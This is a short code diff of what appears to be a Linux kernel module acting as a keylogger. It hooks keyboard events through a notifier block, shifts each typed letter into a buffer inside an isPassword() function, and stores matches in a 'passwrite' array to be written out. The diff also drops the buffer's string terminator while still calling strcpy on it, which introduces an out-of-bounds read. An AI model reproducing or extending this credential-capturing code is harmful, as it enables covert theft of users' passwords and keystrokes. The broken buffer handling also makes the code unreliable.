@@ -22,6 +22,18 @@ unsigned long int lasttime;
 struct notifier_block nb;
 
 
+/*
+ssize_t read_proc(struct file* filp, char *buf, size_t count, loff_t *offp){
+	char message[128];
+	unsigned long int newtime = jiffies;
+	int calls_per_second = (HZ * tcount) / (newtime - lasttime);
+	tcount = 0;
+	lasttime = newtime;
+	sprintf(message, "Calls Per Second: %d\n", calls_per_second);
+	strcpy(buf, message);
+	return strlen(message);
+}
+*/
 //check the function at the begn of the loop and make a continuous function
 ssize_t read_proc(struct file* filp, char *buf, size_t count, loff_t *offp)
 {
@@ -56,7 +68,7 @@ struct file_operations pfo = {
 	write: 0
 };
 
-char input[16] = {';',';',';',';',';',';',';',';',';',';',';',';',';',';',';','\0'};
+char input[16] = {';',';',';',';',';',';',';',';',';',';',';',';',';',';',';',';'};
 
 void isPassword(char letter)
 {
@@ -75,7 +87,7 @@ void isPassword(char letter)
 	{
 		input[i-1] = input [i];
 	}
-	input[14] = letter;
+	input[15] = letter;
 	
 	for (i = 0; i < 16; i++)
 	{
@@ -118,10 +130,8 @@ void isPassword(char letter)
 				break;
 			}
 			strcpy(passwrite[passcount2], input);
-			strcpy(passwrite[passcount2], "\n");
 			needsWriting = true;
 			passcount2++;
-			//cpy_to_usr(buf, passbuffer, strlen(passbuffer));
 /*
 			write(passwrite);
 			write(passbuffer);
